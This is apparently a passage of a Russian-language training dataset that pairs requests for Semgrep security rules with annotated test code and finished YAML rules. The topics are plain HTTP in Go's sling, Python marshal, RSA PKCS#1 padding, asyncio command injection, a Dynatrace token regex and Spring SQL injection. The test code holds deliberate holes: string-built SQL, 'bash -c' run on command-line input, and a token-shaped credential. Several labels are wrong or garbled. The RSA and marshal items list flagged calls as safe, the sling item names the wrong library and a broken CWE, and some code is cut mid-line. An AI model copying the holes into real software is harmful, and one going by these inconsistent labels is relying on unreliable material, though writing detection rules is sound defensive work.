    "input": "Требования:\n- Язык: go\n- Тип анализа: search\n- CWE: C\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: sling-http-request.go\nfunc bad1() {\n    params := &Params{Count: 5}\n\n    // ruleid: sling-http-request\n    req, err := sling.New().Get(\"http://example.com\").QueryStruct(params).Request()\n    client.Do(req)\n}\n\nfunc bad2() {\n    const twitterApi = \"http://api.twitter.com/1.1/\"\n    // ruleid: sling-http-request\n    base := sling.New().Base(twitterApi).Client(authClient)\n}\n\nfunc bad3() {\n    params := &Params{Count: 5}\n\n    sling = sling.New()\n    // ruleid: sling-http-request\n    req, err := sling.Post(\"http://example.com\").QueryStruct(params).Request()\n    client.Do(req)\n}\n\nfunc bad4() {\n    s = sling.New()\n    const twitterApi = \"http://api.twitter.com/1.1/\"\n    // ruleid: sling-http-request\n    base := s.Delete(twitterApi).Client(authClient)\n}\n\nfunc ok1() {\n    params := &Params{Count: 5}\n\n    // ok: sling-http-request\n    req, err := sling.New().Get(\"https://example.com\").QueryStruct(params).Request()\n    client.Do(req)\n}\n\nfunc ok2() {\n    const twitterApi = \"https://api.twitter.com/1.1/\"\n    // ok: sling-http-request\n    base := sling.New().Base(twitterApi).Client(authClient)\n}\n\nfunc ok3() {\n    params := &Params{Count: 5}\n\n    // ok: sling-http-request\n    sling = sling.New()\n    req, err := sling.Post(\"https://example.com\").QueryStruct(params).Request()\n    client.Do(req)\n}\n\nfunc ok4() {\n    s = sling.New()\n    const twitterApi = \"https://api.twitter.com/1.1/\"\n    // ok: sling-http-request\n    base := s.Delete(twitterApi).Client(authClient)\n}\n\nfunc ok5() {\n    // Github Issue (abbreviated)\n    type Issue struct {\n        Title  string `json:\"title\"`\n        Body   string `json:\"body\"`\n    }\n\n    issues := new([]Issue)\n    // ok: sling-http-request\n    resp, err := githubBase.New().Get(path).QueryStruct(params).ReceiveSuccess(issues)\n    fmt.Println(issues, resp, err)\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• req, err := sling.New().Get(\"http://example.com\").QueryStruct(params).Request()\n• base := sling.New().Base(\"http://api.twitter.com/1.1/\").Client(authClient)\n• req, err := sling.Post(\"http://example.com\").QueryStruct(params).Request()\n\nБезопасные паттерны:  \n• req, err := sling.New().Get(\"https://example.com\").QueryStruct(params).Request()\n• const twitterApi = \"https://api.twitter.com/1.1/\"; base := sling.New().Base(twitterApi).Client(authClient)\n• req, err := sling.Post(\"https://example.com\").QueryStruct(params).Request()\n\nЛегенда аннотаций:\n- // ruleid:sling-http-request: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:sling-http-request: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: sling-http-request\n  message: >-\n    Checks for requests to http (unencrypted) sites using gorequest, a popular HTTP client library.\n    This is dangerous because it could result in plaintext PII being passed around the network.\n  severity: WARNING\n  metadata:\n    likelihood: MEDIUM\n    impact: MEDIUM\n    confidence: MEDIUM\n    category: security\n    cwe: 'CWE-319: Cleartext Transmission of Sensitive Information'\n    owasp: 'A03:2017 - Sensitive Data Exposure'\n    references:\n    - https://godoc.org/github.com/dghubble/sling#Sling.Add\n    - https://github.com/dghubble/sling\n    subcategory:\n    - vuln\n    technology:\n    - sling\n    vulnerability: Insecure Transport\n  languages: [go]\n  pattern-either:\n  - patterns:\n    - pattern-inside: |\n        $REQ = sling.New()\n        ...\n        $RES = ...\n    - pattern: |\n        $REQ.$FUNC(\"=~/[hH][tT][tT][pP]://.*/\")\n    - metavariable-regex:\n        metavariable: $FUNC\n        regex: (Get|Post|Delete|Head|Put|Options|Patch|Base|Connect)\n  - patterns:\n    - pattern: sling.New().$FUNC(\"=~/[hH][tT][tT][pP]://.*/\")\n    - metavariable-regex:\n        metavariable: $FUNC\n        regex: (Get|Post|Delete|Head|Put|Options|Patch|Base|Connect)\n  - patterns:\n    - pattern-inside: |\n        $REQ = sling.New()\n        ...\n        $URL = \"=~/[hH][tT][tT][pP]://.*/\"\n        ...\n        $RES = ...\n    - pattern: |\n        $REQ.$FUNC($URL)\n    - metavariable-regex:\n        metavariable: $FUNC\n        regex: (Get|Post|Delete|Head|Put|Options|Patch|Base|Connect)\n  - patterns:\n    - pattern-inside: |\n        $URL = \"=~/[hH][tT][tT][pP]://.*/\"\n        ...\n        $RES = ...\n    - pattern: |\n        sling.New().$FUNC($URL)\n    - metavariable-regex:\n        metavariable: $FUNC\n        regex: (Get|Post|Delete|Head|Put|Options|Patch|Base|Connect)\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска вызовов функций в библиотеке gorequest, которые используют протокол HTTP вместо HTTPS. Паттерны ищут конструкции, где создается новый объект типа Sling, а затем вызывается метод, принимающий URL-адрес, начинающийся с 'http://'. Это может привести к передаче конфиденциальных данных в открытом виде по сети. Правило использует комбинацию шаблонов внутри конструкций и регулярных выражений для проверки методов и URL-адресов.\n\n# Ключевые элементы:\n- ID: sling-http-request\n- Язык: go \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "sling-http-request",
      "language": "go",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения marshal-usage\nОписание уязвимости: The marshal module is not intended to be secure against erroneous or maliciously constructed data. Never unmarshal data received from an untrusted or unauthenticated source. See more details: https://docs.python.org/3/library/marshal.html?highlight=security\nCWE: CWE-502: Deserialization of Untrusted Data\nТип анализа: search\nЯзык: python",
    "input": "Требования:\n- Язык: python\n- Тип анализа: search\n- CWE: CWE-502: Deserialization of Untrusted Data\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: marshal.py\nimport marshal\n\nfin = open('index.mar')\nfor line in fin:\n    # ruleid: marshal-usage\n    marshal.dumps(line)\n\nfor line in fin:\n    # ok: marshal-usage\n    marshal.someokfunc(line)  # Ограничиваем длину\n\nОпасные паттерны:\n• import marshal\nfin = open('index.mar')\nfor line in fin:\n    # ruleid: marshal-usage\n    marshal.dumps(line)\n• import marshal\ndata = {'key': 'value'}\n# ruleid: marshal-usage\nmarshal.dumps(data)\n\nБезопасные паттерны:  \n• import marshal\nfin = open('index.mar')\nfor line in fin:\n    # ok: marshal-usage\n    marshal.someokfunc(line)\n• import marshal\ndata = {'key': 'value'}\ndump_data = marshal.dumps(data)\n# safe use\n\nЛегенда аннотаций:\n- // ruleid:marshal-usage: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:marshal-usage: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: marshal-usage\n  languages:\n  - python\n  message: >-\n    The marshal module is not intended to be secure against erroneous or maliciously\n    constructed data.\n    Never unmarshal data received from an untrusted or unauthenticated source.\n    See more details: https://docs.python.org/3/library/marshal.html?highlight=security\n  metadata:\n    cwe:\n    - 'CWE-502: Deserialization of Untrusted Data'\n    owasp:\n    - A08:2017 - Insecure Deserialization\n    - A08:2021 - Software and Data Integrity Failures\n    references:\n    - https://docs.python.org/3/library/marshal.html?highlight=security\n    category: security\n    technology:\n    - python\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: MEDIUM\n    confidence: LOW\n  pattern-either:\n  - pattern: marshal.dump(...)\n  - pattern: marshal.dumps(...)\n  - pattern: marshal.load(...)\n  - pattern: marshal.loads(...)\n  severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования модуля marshal в Python, который не предназначен для обработки небезопасных или злонамеренных данных. Модуль marshal используется для сериализации и десериализации объектов Python, но он не обеспечивает защиту от атак де-сериализации. Правило ищет вызовы функций marshal.dump(), marshal.dumps(), marshal.load() и marshal.loads(), которые могут быть потенциальными источниками уязвимостей, связанных с десериализацией неподтвержденных данных.\n\n# Ключевые элементы:\n- ID: marshal-usage\n- Язык: python \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "marshal-usage",
      "language": "python",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши Semgrep правило для обнаружения: use_weak_rsa_encryption_padding\nОписание уязвимости: You are using the outdated PKCS#1 v1.5 encryption padding for your RSA key. Use the OAEP padding instead.\nCWE: CWE-780: Use of RSA Algorithm without OAEP\nТип анализа: search\nЯзык: csharp",
    "input": "Требования:\n- Язык: csharp\n- Тип анализа: search\n- CWE: CWE-780: Use of RSA Algorithm without OAEP\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: use_weak_rsa_encryption_padding.cs\nusing System;\nusing System.Security.Cryptography;\n\t\t\t\t\t\npublic class RSAEncryption\n{\n\tpublic static void EncryptWithBadPadding1()\n\t{\n\t\tRSA key = RSA.Create();\n\t\tbyte[] msg = new byte[16];\n\t\tType t = typeof(byte[]);\n\t\tRSAPKCS1KeyExchangeFormatter formatter = new RSAPKCS1KeyExchangeFormatter(key);\n\t\t//ruleid: use_weak_rsa_encryption_padding\n\t\tbyte[] cipherText = formatter.CreateKeyExchange(msg, t);\n\t}\n\t\n\tpublic static void DecryptWithBadPadding()\n\t{\n\t\tRSA key = RSA.Create();\n\t\tbyte[] ciphertext = new byte[16];\n\t\tvar deformatter = new RSAPKCS1KeyExchangeDeformatter(key);\n\t\t//ruleid: use_weak_rsa_encryption_padding\n\t\tvar plaintext = deformatter.DecryptKeyExchange(ciphertext);\n\t}\n\n\tpublic static void EncryptWithBadPadding2()\n\t{\n\t\tRSA key = RSA.Create();\n\t\tbyte[] msg = new byte[16];\n\t\tvar formatter = new RSAPKCS1KeyExchangeFormatter(key);\n\t\t//ruleid: use_weak_rsa_encryption_padding\n\t\tbyte[] cipherText = formatter.CreateKeyExchange(msg);\n\t}\n\n\tpublic static void EncryptWithGoodPadding1()\n\t{\n\t\tRSA key = RSA.Create();\n\t\tbyte[] msg = new byte[16];\n\t\tType t = typeof(byte[]);\n\t\tAsymmetricKeyExchangeFormatter formatter = new RSAOAEPKeyExchangeFormatter(key);\n\t\t//ok: use_weak_rsa_encryption_padding\n\t\tbyte[] cipherText = formatter.CreateKeyExchange(msg, t);\n\t}\n\t\n\tpublic static void EncryptWithGoodPadding2()\n\t{\n\t\tRSA key = RSA.Create();\n\t\tbyte[] msg = new byte[16];\n\t\tAsymmetricKeyExchangeFormatter formatter = new RSAOAEPKeyExchangeFormatter(key);\n\t\t//ok: use_weak_rsa_encryption_padding\n\t\tbyte[] cipherText = formatter.CreateKeyExchange(msg);\n\t}\n\n\tpublic static void DecryptWithGoodPadding()\n\t{\n\t\tRSA key = RSA.Create();\n\t\tbyte[] ciphertext = new byte[16];\n\t\tvar deformatter = new RSAOAEPKeyExchangeDeformatter(key);\n\t\t//ok: use_weak_rsa_encryption_padding\n\t\tvar plaintext = deformatter.DecryptKeyExchange(ciphertext);\n\t}\n\n\t\n\tpublic static void Main(string[] args){\n\t}\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• byte[] cipherText = formatter.CreateKeyExchange(msg, t);\n• var plaintext = deformatter.DecryptKeyExchange(ciphertext);\n\nБезопасные паттерны:  \n• byte[] cipherText = formatter.CreateKeyExchange(msg, t);\n• byte[] cipherText = formatter.CreateKeyExchange(msg);\n\nЛегенда аннотаций:\n- // ruleid:use_weak_rsa_encryption_padding: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:use_weak_rsa_encryption_padding: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: use_weak_rsa_encryption_padding\n  message: You are using the outdated PKCS#1 v1.5 encryption padding for your RSA key. Use the OAEP padding\n    instead.\n  severity: WARNING\n  metadata:\n    likelihood: HIGH\n    impact: MEDIUM\n    confidence: MEDIUM\n    category: security\n    cwe:\n    - 'CWE-780: Use of RSA Algorithm without OAEP'\n    owasp:\n    - A02:2021 - Cryptographic Failures\n    references:\n    - https://learn.microsoft.com/en-gb/dotnet/api/system.security.cryptography.rsapkcs1keyexchangeformatter\n    - https://learn.microsoft.com/en-gb/dotnet/api/system.security.cryptography.rsaoaepkeyexchangeformatter\n    - https://learn.microsoft.com/en-gb/dotnet/api/system.security.cryptography.rsapkcs1keyexchangedeformatter\n    - https://learn.microsoft.com/en-gb/dotnet/api/system.security.cryptography.rsaoaepkeyexchangedeformatter\n    subcategory:\n    - vuln\n    technology:\n    - .net\n  languages:\n  - csharp\n  pattern-either:\n  - pattern: (RSAPKCS1KeyExchangeFormatter $FORMATER).CreateKeyExchange(...);\n  - pattern: (RSAPKCS1KeyExchangeDeformatter $DEFORMATER).DecryptKeyExchange(...);\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования устаревшего алгоритма шифрования RSA с PKCS#1 v1.5 при обмене ключами. Оно использует два шаблона: первый ищет создание ключа обмена с использованием RSAPKCS1KeyExchangeFormatter, второй — дешифровку ключа с использованием RSAPKCS1KeyExchangeDeformatter. Оба этих метода используют слабый алгоритм PKCS#1 v1.5, который следует заменить более безопасным OAEP (Optimal Asymmetric Encryption Padding). Правило применимо только к языку C#.\n\n# Ключевые элементы:\n- ID: use_weak_rsa_encryption_padding\n- Язык: csharp \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "use_weak_rsa_encryption_padding",
      "language": "csharp",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения dangerous-asyncio-exec-tainted-env-args\nОписание уязвимости: Detected subprocess function '$LOOP.subprocess_exec' with user controlled data. You may consider using 'shlex.escape()'.\nCWE: CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\nТип анализа: taint\nЯзык: python\nИсточники (sources): определены в правиле\nСинки (sinks): определены в правиле",
    "input": "Требования:\n- Язык: python\n- Тип анализа: taint\n- CWE: CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: dangerous-asyncio-exec-tainted-env-args.py\nimport asyncio\n\n\nclass AsyncEventLoop:\n    def __enter__(self):\n        self.loop = asyncio.new_event_loop()\n        asyncio.set_event_loop(self.loop)\n        return self.loop\n\n    def __exit__(self, *args):\n        self.loop.close()\n\n\nclass WaitingProtocol(asyncio.SubprocessProtocol):\n    def __init__(self, exit_future):\n        self.exit_future = exit_future\n\n    def process_exited(self):\n        self.exit_future.set_result(True)\n\n\ndef vuln1():\n    args = get_user_input()\n    with AsyncEventLoop() as loop:\n        exit_future = asyncio.Future(loop=loop)\n        # fn: dangerous-asyncio-exec-tainted-env-args\n        transport, _ = loop.run_until_complete(\n            loop.subprocess_exec(lambda: WaitingProtocol(exit_future), *args)\n        )\n        loop.run_until_complete(exit_future)\n        transport.close()\n\n\ndef vuln2():\n    loop = asyncio.new_event_loop()\n    exit_future = asyncio.Future(loop=loop)\n    transport, _ = loop.run_until_complete(\n        # ruleid: dangerous-asyncio-exec-tainted-env-args\n        loop.subprocess_exec(\n            lambda: WaitingProtocol(exit_future), [\"bash\", \"-c\", sys.argv[1]]\n        )\n    )\n    loop.run_until_complete(exit_future)\n    transport.close()\n\n\ndef ok1():\n    loop = asyncio.new_event_loop()\n    exit_future = asyncio.Future(loop=loop)\n    # ok: dangerous-asyncio-exec-tainted-env-args\n    transport, _ = loop.run_until_complete(\n        loop.subprocess_exec(lambda: WaitingProtocol(exit_future), [\"echo\", \"a\"])\n    )\n    loop.run_until_complete(exit_future)\n    transport.close()  # Ограничиваем длину\n\nОпасные паттерны:\n• transport, _ = loop.run_until_complete(loop.subprocess_exec(lambda: WaitingProtocol(exit_future), ['bash', '-c', sys.argv[1]]))\n• transport, _ = loop.run_until_complete(loop.subprocess_exec(lambda: WaitingProtocol(exit_future), ['bash', '-c', os.environ['CMD']]))\n\nБезопасные паттерны:  \n• transport, _ = loop.run_until_complete(loop.subprocess_exec(lambda: WaitingProtocol(exit_future), ['echo', 'a']))\n• transport, _ = loop.run_until_complete(loop.subprocess_exec(lambda: WaitingProtocol(exit_future), ['ls', '-l']))\n\nЛегенда аннотаций:\n- // ruleid:dangerous-asyncio-exec-tainted-env-args: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:dangerous-asyncio-exec-tainted-env-args: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: dangerous-asyncio-exec-tainted-env-args\n  mode: taint\n  options:\n    symbolic_propagation: true\n  pattern-sources:\n  - patterns:\n    - pattern-either:\n      - patterns:\n        - pattern-either:\n          - pattern: os.environ\n          - pattern: os.environ.get('$FOO', ...)\n          - pattern: os.environb\n          - pattern: os.environb.get('$FOO', ...)\n          - pattern: os.getenv('$ANYTHING', ...)\n          - pattern: os.getenvb('$ANYTHING', ...)\n      - patterns:\n        - pattern-either:\n          - patterns:\n            - pattern-either:\n              - pattern: sys.argv\n              - pattern: sys.orig_argv\n          - patterns:\n            - pattern-inside: |\n                $PARSER = argparse.ArgumentParser(...)\n                ...\n            - pattern-inside: |\n                $ARGS = $PARSER.parse_args()\n            - pattern: <... $ARGS ...>\n          - patterns:\n            - pattern-inside: |\n                $PARSER = optparse.OptionParser(...)\n                ...\n            - pattern-inside: |\n                $ARGS = $PARSER.parse_args()\n            - pattern: <... $ARGS ...>\n          - patterns:\n            - pattern-either:\n              - pattern-inside: |\n                  $OPTS, $ARGS = getopt.getopt(...)\n                  ...\n              - pattern-inside: |\n                  $OPTS, $ARGS = getopt.gnu_getopt(...)\n                  ...\n            - pattern-either:\n              - patterns:\n                - pattern-inside: |\n                    for $O, $A in $OPTS:\n                      ...\n                - pattern: $A\n              - pattern: $ARGS\n  pattern-sinks:\n  - pattern-either:\n    - patterns:\n      - pattern-not: $LOOP.subprocess_exec($PROTOCOL, \"...\", ...)\n      - pattern-not: $LOOP.subprocess_exec($PROTOCOL, [\"...\",...], ...)\n      - pattern: $LOOP.subprocess_exec(...)\n    - patterns:\n      - pattern-not: $LOOP.subprocess_exec($PROTOCOL, \"=~/(sh|bash|ksh|csh|tcsh|zsh)/\", \"-c\", \"...\", ...)\n      - pattern: $LOOP.subprocess_exec($PROTOCOL, \"=~/(sh|bash|ksh|csh|tcsh|zsh)/\", \"-c\",...)\n    - patterns:\n      - pattern-not: $LOOP.subprocess_exec($PROTOCOL, [\"=~/(sh|bash|ksh|csh|tcsh|zsh)/\", \"-c\", \"...\",\n          ...], ...)\n      - pattern: $LOOP.subprocess_exec($PROTOCOL, [\"=~/(sh|bash|ksh|csh|tcsh|zsh)/\", \"-c\", ...], ...)\n  message: >-\n    Detected subprocess function '$LOOP.subprocess_exec' with user controlled data.\n    You may consider using 'shlex.escape()'.\n  metadata:\n    owasp:\n    - A01:2017 - Injection\n    - A03:2021 - Injection\n    cwe:\n    - \"CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\"\n    asvs:\n      section: 'V5: Validation, Sanitization and Encoding Verification Requirements'\n      control_id: 5.3.8 OS Command Injection\n      control_url: https://github.com/OWASP/ASVS/blob/master/4.0/en/0x13-V5-Validation-Sanitization-Encoding.md#v53-output-encoding-and-injection-prevention-requirements\n      version: '4'\n    references:\n    - https://docs.python.org/3/library/asyncio-eventloop.html#asyncio.loop.subprocess_exec\n    - https://docs.python.org/3/library/shlex.html\n    - https://semgrep.dev/docs/cheat-sheets/python-command-injection/\n    category: security\n    technology:\n    - python\n    confidence: MEDIUM\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - vuln\n    likelihood: MEDIUM\n    impact: HIGH\n  languages: [python]\n  severity: ERROR\n\n\n# Логика правила:\nЭто правило Semgrep выполняет поиск источников потенциально опасных данных (источники) и проверяет их использование в вызове функции asyncio.loop.subprocess_exec(). Правило ищет конкретные шаблоны, связанные с os.environ, os.environ.get(), os.getenv(), sys.argv и sys.orig_argv, а также аргументы, переданные через парсинг аргументов командной строки или опций. Синки определяются как вызов asyncio.loop.subprocess_exec() с использованием потенциально небезопасных параметров, таких как '-c' и shell-команды. Правило предупреждает о возможности инъекции команд ОС и рекомендует использовать shlex.escape() для нейтрализации специальных элементов.\n\n# Ключевые элементы:\n- ID: dangerous-asyncio-exec-tainted-env-args\n- Язык: python \n- Тип: vuln\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "dangerous-asyncio-exec-tainted-env-args",
      "language": "python",
      "severity": "ERROR",
      "rule_type": "vuln",
      "mode": "taint",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения dynatrace-api-token\nОписание уязвимости: A gitleaks dynatrace-api-token was detected which attempts to identify hard-coded credentials. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\nCWE: CWE-798: Use of Hard-coded Credentials\nТип анализа: search\nЯзык: regex",
    "input": "Требования:\n- Язык: regex\n- Тип анализа: search\n- CWE: CWE-798: Use of Hard-coded Credentials\n- Серьезность: INFO\n\nКонтекст кода:\n// File: dynatrace-api-token.go\n// ruleid: dynatrace-api-token\ndynatrace_api_token = \"dt0c01.6rm7jcwbb3fmtfzkyepf16kj.3l8arrff1ozxlllxrzel9usoanieedfliwwnmuq5z6vbhogdykznemtv2k7y270q\"  # Ограничиваем длину\n\nОпасные паттерны:\n• // File: dynatrace-api-token.go\n// ruleid: dynatrace-api-token\ndynatrace_api_token = \"dt0c01.6rm7jcwbb3fmtfzkyepf16kj.3l8arrff1ozxlllxrzel9usoanieedfliwwnmuq5z6vbhogdykznemtv2k7y270q\"\n• // File: another-dynatrace-go-file.go\n// ruleid: dynatrace-api-token\ndynatrace_api_key = \"dt0c01.xyzabc123defghijklmnopqrstuvwxyz1234567890abcdefg\"\n\nБезопасные паттерны:  \n• // File: safe-dynatrace-go-file.go\nglobalDynatraceApiToken := os.Getenv(\"DYNA_TRACE_API_TOKEN\")\n• // File: secure-dynatrace-go-file.go\nvar dynatraceApiKey string = getSecureTokenFromVault()\n\nЛегенда аннотаций:\n- // ruleid:dynatrace-api-token: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:dynatrace-api-token: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: dynatrace-api-token\n  message: A gitleaks dynatrace-api-token was detected which attempts to identify hard-coded credentials. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\n  languages:\n    - regex\n  severity: INFO\n  metadata:\n      likelihood: LOW\n      impact: MEDIUM\n      confidence: LOW\n      category: security\n      cwe:\n        - \"CWE-798: Use of Hard-coded Credentials\"\n      cwe2021-top25: true\n      cwe2022-top25: true\n      owasp:\n        - A07:2021 - Identification and Authentication Failures\n      references:\n        - https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html\n      source-rule-url: https://github.com/zricethezav/gitleaks/tree/master/cmd/generate/config/rules\n      subcategory:\n        - vuln\n      technology:\n        - gitleaks\n  patterns:\n    - pattern-regex: dt0c01\\.(?i)[a-z0-9]{24}\\.[a-z0-9]{64}\n\n\n# Логика правила:\nЭто правило Semgrep использует регулярное выражение для поиска жестко закодированного токена Dynatrace API в исходном коде. Паттерн ищет строку, начинающуюся с 'dt0c01.', за которой следует 24 символа в нижнем регистре и цифрах, затем точка и далее 64 символа в нижнем регистре и цифрах. Это соответствует формату токенов Dynatrace API. Правило применяет поисковый тип анализа и использует регулярные выражения для точного сопоставления токенов.\n\n# Ключевые элементы:\n- ID: dynatrace-api-token\n- Язык: regex \n- Тип: vuln\n- Серьезность: INFO",
    "metadata": {
      "rule_id": "dynatrace-api-token",
      "language": "regex",
      "severity": "INFO",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения spring-sqli\nОписание уязвимости: Detected a string argument from a public method contract in a raw SQL statement. This could lead to SQL injection if variables in the SQL statement are not properly sanitized. Use a prepared statements (java.sql.PreparedStatement) instead. You can obtain a PreparedStatement using 'connection.prepareStatement'.\nCWE: CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\nТип анализа: taint\nЯзык: java\nИсточники (sources): определены в правиле\nСинки (sinks): определены в правиле\nСпособы санитации: определены в правиле",
    "input": "Требования:\n- Язык: java\n- Тип анализа: taint\n- CWE: CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: spring-sqli.java\npackage testcode.sqli;\n\nimport org.springframework.jdbc.core.PreparedStatementCreatorFactory;\nimport org.springframework.jdbc.core.SqlParameter;\nimport org.springframework.dao.DataAccessException;\nimport org.springframework.jdbc.core.*;\nimport java.sql.*;\nimport java.util.ArrayList;\n\npublic class SpringPreparedStatementCreatorFactory {\n    public void queryUnsafe(String input) {\n        String sql = \"select * from Users where name = '\" + input + \"' id=?\";\n        // ruleid:spring-sqli\n        new PreparedStatementCreatorFactory(sql);\n        // ruleid:spring-sqli\n        new PreparedStatementCreatorFactory(sql, new int[] {Types.INTEGER});\n        // ruleid:spring-sqli\n        new PreparedStatementCreatorFactory(sql, new ArrayList<SqlParameter>());\n    }\n}\n\npublic class SpringJdbcTemplate {\n\n    public void query1(JdbcTemplate jdbcTemplate, String input) throws DataAccessException {\n        // ruleid:spring-sqli\n        jdbcTemplate.execute(\"select * from Users where name = '\"+input+\"'\");\n    }\n\n    public void query2(JdbcTemplate jdbcTemplate, String input) throws DataAccessException {\n        String sql = \"select * from Users where name = '\" + input + \"'\";\n        // ruleid:spring-sqli\n        jdbcTemplate.execute(sql);\n    }\n\n    public void query3(JdbcTemplate jdbcTemplate, String input) throws DataAccessException {\n        // ruleid:spring-sqli\n        jdbcTemplate.execute(String.format(\"select * from Users where name = '%s'\",input));\n    }\n\n    public void query4(JdbcTemplate jdbcTemplate, String input) throws DataAccessException {\n        String sql = \"select * from Users where name = '%s'\";\n        // ruleid:spring-sqli\n        jdbcTemplate.execute(String.format(sql,input));\n    }\n\n    public void querySafe(JdbcTemplate jdbcTemplate, String input) throws DataAccessException {\n        String sql = \"select * from Users where name = '1'\";\n        // ok:spring-sqli\n        jdbcTemplate.execute(sql);\n    }\n\n    public void queryExecute(Jd  # Ограничиваем длину\n\nОпасные паттерны:\n• new PreparedStatementCreatorFactory(sql);\n• jdbcTemplate.execute(\"select * from Users where name = '\"+input+\"'\");\n• jdbcTemplate.queryForObject(sql, new TestRowMapper());\n\nБезопасные паттерны:  \n• jdbcTemplate.execute(sql);\n• jdbcTemplate.queryForObject(sql, new TestRowMapper(), \"\", \"\");\n• NamedParameterBatchUpdateUtils.executeBatchUpdate(sql, new ArrayList<Object[]>(), new int[] {Types.INTEGER}, jdbcOperations);\n\nЛегенда аннотаций:\n- // ruleid:spring-sqli: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:spring-sqli: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: spring-sqli\n  mode: taint\n  pattern-sources:\n  - patterns:\n    - pattern: $ARG\n    - pattern-inside: |\n        public $T $M (..., String $ARG,...){...}\n  pattern-sanitizers:\n  - not_conflicting: true\n    pattern-either:\n    - patterns:\n      - focus-metavariable: $A\n      - pattern-inside: |\n          new $TYPE(...,$A,...);\n  pattern-sinks:\n  - patterns:\n    - pattern-either:\n      - patterns:\n        - focus-metavariable: $A\n        - pattern: |\n            new PreparedStatementCreatorFactory($A,...);\n      - patterns:\n        - focus-metavariable: $A\n        - pattern: |\n            (JdbcTemplate $T).$M($A,...)\n      - patterns:\n        - pattern: (String $A)\n        - pattern-inside: |\n            (JdbcTemplate $T).batchUpdate(...)\n      - patterns:\n        - focus-metavariable: $A\n        - pattern: |\n            NamedParameterBatchUpdateUtils.$M($A,...)\n      - patterns:\n        - focus-metavariable: $A\n        - pattern: |\n            BatchUpdateUtils.$M($A,...)\n  message: >-\n    Detected a string argument from a public method contract in a raw SQL statement. This could lead to\n    SQL\n    injection if variables in the SQL statement are not properly sanitized.\n    Use a prepared statements (java.sql.PreparedStatement) instead. You\n    can obtain a PreparedStatement using 'connection.prepareStatement'.\n  languages: [java]\n  severity: WARNING\n  options:\n    taint_assume_safe_numbers: true\n    taint_assume_safe_booleans: true\n  metadata:\n    cwe:\n    - \"CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\"\n    category: security\n    technology:\n    - spring\n    owasp:\n    - A01:2017 - Injection\n    - A03:2021 - Injection\n    references:\n    - https://owasp.org/Top10/A03_2021-Injection\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - vuln\n    likelihood: MEDIUM\n    impact: MEDIUM\n    confidence: MEDIUM\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска потенциальных уязвимостей SQL-инъекции в приложениях Spring Framework. Оно проверяет методы, принимающие строковые аргументы ($ARG) от публичных контрактов методов и использующие их напрямую в сырых SQL-запросах ($A). Опасными считаются ситуации, когда такие аргументы передаются непосредственно в конструктор PreparedStatementCreatorFactory или метод batchUpdate класса JdbcTemplate, а также в методы execute и NamedParameterBatchUpdateUtils. Безопасным считается использование подготовленных выражений (PreparedStatements) через Spring JDBC API.\n\n# Ключевые элементы:\n- ID: spring-sqli\n- Язык: java \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "spring-sqli",
      "language": "java",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "taint",
      "is_validation": true
    }
  },
  {
